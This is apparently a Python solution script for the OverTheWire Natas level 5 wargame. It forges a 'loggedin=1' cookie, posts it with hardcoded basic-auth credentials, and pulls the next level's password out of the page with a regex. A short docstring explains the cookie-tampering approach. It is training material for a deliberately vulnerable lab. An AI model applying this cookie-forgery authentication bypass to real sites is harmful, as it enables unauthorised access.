import requests
import re

name = "natas5"

url = f"http://{name}.natas.labs.overthewire.org/index.php"
auth = (f"{name}","iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq")

session = requests.session()
cookies = {'loggedin': '1'}
logon = session.post(url,auth=auth,cookies=cookies)
regex = re.compile(r'The password for natas6 is ([\w\d]+)')
try:
    passwd = regex.findall(logon.text)[0]
    print(passwd)
except IndexError:
    ...
    
"""Natas 5
    Ok so this one is simillar to Natas 4. First I looked up on the headers of logon where I saw
    'Set-cookie': 'loggedin' = '1', so I prepared a cookie {'loogedin':'1'} and sent it together with auth data
    After I did that, password revealed.

"""
